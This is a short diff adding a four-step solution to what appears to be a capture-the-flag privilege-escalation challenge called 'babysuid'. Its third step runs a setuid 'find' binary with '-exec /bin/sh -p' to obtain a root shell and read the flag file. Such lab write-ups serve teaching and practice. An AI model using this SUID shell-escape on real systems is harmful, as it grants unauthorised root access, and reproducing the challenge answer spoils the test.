@@ -1,0 +1,4 @@
+1 Connect to terminal
+2 Read instruction : /challenge/babysuid
+3 Execute sh root : /challenge/bin/find . -exec /bin/sh -p \; -quit
+4 Read flag : cat /flag
